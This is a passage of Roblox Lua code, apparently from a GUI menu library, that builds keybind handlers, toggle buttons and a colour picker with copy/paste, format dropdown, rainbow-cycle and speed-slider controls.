													if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = true 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														elseif Element.value.Type == "Toggle" then 
															Element.value.Active = not Element.value.Active 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindtoggle(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end
														end 
														
													end 
												end 
											else 
												Element.value.Active = true 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end) 
									game:GetService("UserInputService").InputEnded:Connect(function(input) 
										if Element.value.Key ~= nil then 
											if C.FIND(Element.value.Key, "Mouse") then 
												if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end 
												end 
											else 
												if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end 
												end 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end) 
								end 
								function Element:SetValue(value) 
									Element.value = value 
									update() 
									if Element.value.Toggle and Element.value.Key ~= nil then
										keybindadd(text, Element.value.Key)
									end
								end 
							elseif type == "Toggle" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Toggle = data.default and data.default.Toggle or false} 

								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								
								Color.BackgroundColor3 = getMainColor()
	function MenuAccent(color)
Color.BackgroundColor3 = color
end						
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46)
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 

								TextLabel.Parent = Button; TextLabel.Name = 'CheckerINeed' 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = getMainColor()}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
								end 

								Button.MouseButton1Down:Connect(function() 
									Element.value.Toggle = not Element.value.Toggle 
									update() 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end) 
								if data.default then 
									update() 
								end 
								values[tabname][sectorname][text] = Element.value 
								function Element:SetValue(value) 
									Element.value = value 
									values[tabname][sectorname][text] = Element.value 
									update() 
									callback(Element.value) 
								end 
							elseif type == "ToggleColor" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Rainbow = false, RainbowSpeed = 3, Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255), SetColor} 
								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 

								TextLabel.Parent = Button 
								TextLabel.Name = 'CheckerINeed'
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = getMainColor()}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
								end


								local ColorH,ColorS,ColorV 

								local ColorP = C.INST("TextButton") 
								local Frame = C.INST("Frame") 
								local Colorpick = C.INST("ImageButton") 
								local ColorDrag = C.INST("Frame") 
								local Huepick = C.INST("ImageButton") 
								local Huedrag = C.INST("Frame") 

								ColorP.Name = "ColorP" 
								ColorP.Parent = Button 
								ColorP.AnchorPoint = C.Vec2(1, 0) 
								ColorP.BackgroundColor3 = Element.value.Color
								ColorP.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorP.Position = C.UDIM2(0, 270, 0.5, -4) 
								ColorP.Size = C.UDIM2(0, 18, 0, 8) 
								ColorP.AutoButtonColor = false 
								ColorP.Font = Enum.Font.Gotham 
								ColorP.Text = "" 
								ColorP.TextColor3 = C.COL3RGB(200, 200, 200) 
								ColorP.TextSize = 11.000






								Frame.Parent = ColorP 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(-0.666666687, -170, 1.375, 0) 
								Frame.Size = C.UDIM2(0, 200, 0, 300)
								Frame.Visible = false 
								Frame.ZIndex = 4

								local Button5 = C.INST("Frame") 
								local Button_25 = C.INST("TextButton") 
								local TextLabel5 = C.INST("TextLabel") 

								Button5.Name = "Button" 
								Button5.Parent = Frame 
								Button5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button5.BackgroundTransparency = 1.000
								Button5.Position = C.UDIM2(0, -20, 0.6, 0)
								Button5.Size = C.UDIM2(1, 0, 0, 15) 
								Button5.ZIndex = 4

								Button_25.Name = "Button" 
								Button_25.Parent = Button5
								Button_25.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_25.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_25.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_25.Size = C.UDIM2(0, 175, 0, 18) 
								Button_25.AutoButtonColor = false 
								Button_25.Font = Enum.Font.SourceSans 
								Button_25.Text = "" 
								Button_25.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_25.TextSize = 11.000
								Button_25.ZIndex = 4

								TextLabel5.Parent = Button_25
								TextLabel5.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel5.BackgroundTransparency = 1.000 
								TextLabel5.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel5.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel5.Font = Enum.Font.Gotham 
								TextLabel5.Text = 'Copy colors' 
								TextLabel5.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel5.TextSize = 11.000
								TextLabel5.ZIndex = 4
								CopyColorsType = "RGB"
								Button_25.MouseButton1Down:Connect(function() 
										TextLabel5.TextColor3 = getMainColor() 
										library:Tween(TextLabel5, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local retarded, lmao = pcall(function()
									
											local l,m,a = C.FLOOR((Element.value.Color.R*255)+0.5),C.FLOOR((Element.value.Color.G*255)+0.5),C.FLOOR((Element.value.Color.B*255)+0.5)

											if CopyColorsType == 'RGB' then
												setclipboard(''..l..','..m..','..a) -- o
											elseif CopyColorsType == 'HEX' then
												setclipboard(C.COL3RGB(l,m,a):ToHex())
											elseif CopyColorsType == 'HSV' then 
												local H,S,V = C.COL3(l,m,a):ToHSV() --hsl, cmyk
												setclipboard(''..H..','..S..','..V)
											end
										end)
											if retarded then
												TextLabel5.Text = 'Success!'
												wait(1.5)
												TextLabel5.Text = 'Copy colors'
											else
												TextLabel5.Text = 'Error!'
												wait(1.5)
												TextLabel5.Text = 'Copy colors'
												print(lmao)
												print(Element.value.Color)
												print(Element.value.Color.value)
											end
								end) 
								Button_25.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_25.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end) 								
								
								
								
								
								
								
								
								
								do
									--Element.value = {Dropdown = data.options[1]} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 
									--Frame.Size = C.UDIM2(0,200,270)
									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = Frame 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, -20, 0.6, 20) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 
									Dropdown.ZIndex = 4

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000
									Button.ZIndex = 4

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = 'RGB'
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel.ZIndex = 4

									local abcd = TextLabel 

									Drop.Name = "Drop" 
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
									Drop.ScrollBarThickness = 4 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = getMainColor() 

									UIListLayout.Parent = Drop 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder --DROPDOWN COPY COLORS
									local table = {'RGB', 'HSV', 'HEX'}
									local num = #table 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									local first = true 
									for i,v in ipairs(table) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												Drop.Visible = false 
												--Element.value.Dropdown = v 
												CopyColorsType = v
												abcd.Text = v 
												--values[tabname][sectorname][text] = Element.value 
												--callback(Element.value) 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end) 
											Button.MouseEnter:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  getMainColor()}) 
											end) 
											Button.MouseLeave:Connect(function() 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
											end) 

											first = false 
										end 
									end

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 
									ImageLabel.ZIndex = 4

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = 'Copy colors type' 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel_3.ZIndex = 4

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 								
								end
								
								
								local Button35 = C.INST("Frame") 
								local Button_325 = C.INST("TextButton") 
								local TextLabel35 = C.INST("TextLabel") 

								Button35.Name = "Button" 
								Button35.Parent = Frame 
								Button35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button35.BackgroundTransparency = 1.000 
								Button35.Position = C.UDIM2(0, -20, 0.6, 60) --edit here
								Button35.Size = C.UDIM2(1, 0, 0, 15) 
								Button35.ZIndex = 4

								Button_325.Name = "Button" 
								Button_325.Parent = Button35
								Button_325.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_325.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_325.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_325.Size = C.UDIM2(0, 175, 0, 18) 
								Button_325.AutoButtonColor = false 
								Button_325.Font = Enum.Font.SourceSans 
								Button_325.Text = "" 
								Button_325.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_325.TextSize = 11.000
								Button_325.ZIndex = 4

								TextLabel35.Parent = Button_325
								TextLabel35.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel35.BackgroundTransparency = 1.000 
								TextLabel35.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel35.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel35.Font = Enum.Font.Gotham 
								TextLabel35.Text = 'Paste colors' 
								TextLabel35.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel35.TextSize = 11.000
								TextLabel35.ZIndex = 4

									

									
								Button_325.MouseButton1Down:Connect(function() 
									TextLabel35.TextColor3 = getMainColor() 
									library:Tween(TextLabel35, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									local clipboard = getclipboard()
									local colors = string.split(clipboard, ',')
									local IsAColor = false
									local WhatKindOfColor = ''
									if pcall(function() return C.COL3HEX(clipboard:gsub('#','')) end) then
										IsAColor = true
										WhatKindOfColor = 'HEX'
									elseif #colors == 3 and (tonumber(colors[1]) and tonumber(colors[1]) <= 256 and tonumber(colors[1]) >= -1) and (tonumber(colors[2]) and tonumber(colors[2]) <= 256 and tonumber(colors[2]) >= -1) and (tonumber(colors[3]) and tonumber(colors[3]) <= 256 and tonumber(colors[3]) >= -1) then
										IsAColor = true
										WhatKindOfColor = 'RGB'
									end
									
									
									if IsAColor then
										local retarded, lmao = pcall(function()
											if WhatKindOfColor == 'RGB' then
												Element.value.Color = C.COL3RGB(colors[1],colors[2],colors[3])
											elseif WhatKindOfColor == 'HEX' then
												Element.value.Color = C.COL3HEX(tostring(clipboard:gsub('#','')))
											end
											ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

											ColorH = C.CLAMP(ColorH,0,1) 
											ColorS = C.CLAMP(ColorS,0,1) 
											ColorV = C.CLAMP(ColorV,0,1) 
											ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
											Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
											
											ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
											Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
											values[tabname][sectorname][text] = Element.value 
											Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
											callback(Element.value) 
										end)
											if retarded then
												TextLabel35.Text = 'Success!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors'
											else
												TextLabel35.Text = 'Error!'
												wait(1.5)
												TextLabel35.Text = 'Paste colors'
												print(lmao)
											end
									else
										TextLabel35.Text = 'Not a color'
										wait(1.5)
										TextLabel35.Text = "Paste colors"
									end
								end)
								Button_325.MouseEnter:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_325.MouseLeave:Connect(function() 
									library:Tween(TextLabel5, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
								
								
								
								
								-------------------------------------------------------------------
									local Toggle123 = C.INST("Frame") 
									local Button123 = C.INST("TextButton") 
									local Color123 = C.INST("Frame") 
									local TextLabel123 = C.INST("TextLabel") 
									
									Toggle123.Name = "Toggle123" 
									Toggle123.Parent = Frame 
									Toggle123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle123.BackgroundTransparency = 1.000 
									Toggle123.Size = C.UDIM2(1, 0, 0, 15) 
									Toggle123.Position = C.UDIM2(0, -5, 0.6, 80) --edit here
									Toggle123.ZIndex = 4
									
									--print('it actually spawned')
									
									Button123.Name = "Button123" 
									Button123.Parent = Toggle123 
									Button123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button123.BackgroundTransparency = 1.000 
									Button123.Size = C.UDIM2(1, 0, 1, 0) 
									Button123.Font = Enum.Font.SourceSans 
									Button123.Text = "" 
									Button123.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button123.TextSize = 11.000
									Button123.ZIndex = 4

									Color123.Name = "Color123" 
									Color123.Parent = Button123
									
									Color123.BackgroundColor3 = getMainColor() 
									
									Color123.BackgroundColor3 = C.COL3RGB(46, 46, 46)
									Color123.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Color123.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color123.Size = C.UDIM2(0, 8, 0, 8) 
									Color123.ZIndex = 4

									TextLabel123.Parent = Button123 
									TextLabel123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel123.BackgroundTransparency = 1.000 
									TextLabel123.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel123.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel123.Font = Enum.Font.Gotham 
									TextLabel123.Text = "Rainbow" 
									TextLabel123.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel123.TextSize = 11.000
									TextLabel123.TextXAlignment = Enum.TextXAlignment.Left 
									TextLabel123.ZIndex = 4

									local function update123() 
										if Element.value.Rainbow then 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = getMainColor()}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											--keybindremove(text, Element.value.Key) 
											tween123 = library:Tween(Color123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel123, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										--values[tabname][sectorname][tabtext][text] = Element.value 
									end
									
									Button123.MouseButton1Down:Connect(function() 
										Element.value.Rainbow = not Element.value.Rainbow
										update123() 				
										--values[tabname][sectorname][tabtext][text] = Element.value 
										--callback(Element.value) 
									end)
								
											game.RunService.RenderStepped:Connect(function()
												if Element.value.Rainbow then
													--Element.value.RainbowSpeed
														ColorH, ColorS, ColorV = (tick() % Element.value.RainbowSpeed/Element.value.RainbowSpeed),1,1

														ColorH = C.CLAMP(ColorH,0,1) 
														ColorS = C.CLAMP(ColorS,0,1) 
														ColorV = C.CLAMP(ColorV,0,1)
																							
														ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
														Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

														ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
														Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
														values[tabname][sectorname][text] = Element.value 
														Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
														callback(Element.value)
																							
																							--library.options['armColor']:SetColor(Color3.fromHSV(i,1,1))
														wait()
																				--		library.options['Accent Color']:SetColor(Color3.fromHSV(i,1,1)) -- also u can change any flag that has color by prinitng flags (table.foreach(library.flags,print)
												end
											end)									
								local Slider2113132 = C.INST("Frame") 
								local TextLabel2113132 = C.INST("TextLabel") 
								local Button2113132 = C.INST("TextButton") 
								local Frame123123 = C.INST("Frame") 
								local UIGradient123123 = C.INST("UIGradient") 
								local Value123123123 = C.INST("TextLabel") 

								Slider2113132.Name = "Slider2113132" 
								Slider2113132.Parent = Frame 
								Slider2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Slider2113132.BackgroundTransparency = 1.000 
								Slider2113132.Position = C.UDIM2(0, -15, 0.6, 93) --edit here
								Slider2113132.Size = C.UDIM2(1, 0, 0, 25) 
								Slider2113132.ZIndex = 4

								TextLabel2113132.Parent = Slider2113132 
								TextLabel2113132.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel2113132.BackgroundTransparency = 1.000 
								TextLabel2113132.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel2113132.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel2113132.Font = Enum.Font.Gotham 
								TextLabel2113132.Text = "Rainbow speed" 
								TextLabel2113132.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel2113132.TextSize = 11.000
								TextLabel2113132.TextXAlignment = Enum.TextXAlignment.Left 
								TextLabel2113132.ZIndex = 4

								Button2113132.Name = "Button2113132" 
								Button2113132.Parent = Slider2113132 
								Button2113132.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button2113132.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button2113132.Position = C.UDIM2(0, 30, 0, 15) 
								Button2113132.Size = C.UDIM2(0, 175, 0, 5) 
								Button2113132.AutoButtonColor = false 
								Button2113132.Font = Enum.Font.SourceSans 
								Button2113132.Text = "" 
								Button2113132.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button2113132.TextSize = 11.000
								Button2113132.ZIndex = 4

								Frame123123.Parent = Button2113132 
								Frame123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame123123.BorderSizePixel = 0 
								Frame123123.Size = C.UDIM2(0.5, 0, 1, 0) 
								Frame123123.ZIndex = 4
								
								UIGradient123123.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, getMainColor()), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient123123.Rotation = 90
								UIGradient123123.Parent = Frame123123


								Value123123123.Name = "Value123123123" 
								Value123123123.Parent = Slider2113132 
								Value123123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value123123123.BackgroundTransparency = 1.000 
								Value123123123.Position = C.UDIM2(0, 30, 0, 15) 
								Value123123123.Size = C.UDIM2(0, 175, 0, 5)  
								Value123123123.Font = Enum.Font.Gotham 
								Value123123123.Text = "50" 
								Value123123123.TextStrokeTransparency = 0.000
								Value123123123.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value123123123.TextSize = 11.000 
								Value123123123.ZIndex = 4
								local min, max, default = 1, 6, 3
								--Element.Value123123123 = {Slider2113132 = default}
								local a
								if min > 0 then 
									a = ((Element.value.RainbowSpeed - min)) / (max-min) 
								else 
									a = (Element.value.RainbowSpeed-min)/(max-min) 
								end 
								Value123123123.Text = default
								Frame123123.Size = C.UDIM2(a,0,1,0) 
								--values[tabname][sectorname][text] = Element.Value123123123 
								local uis = game:GetService('UserInputService')
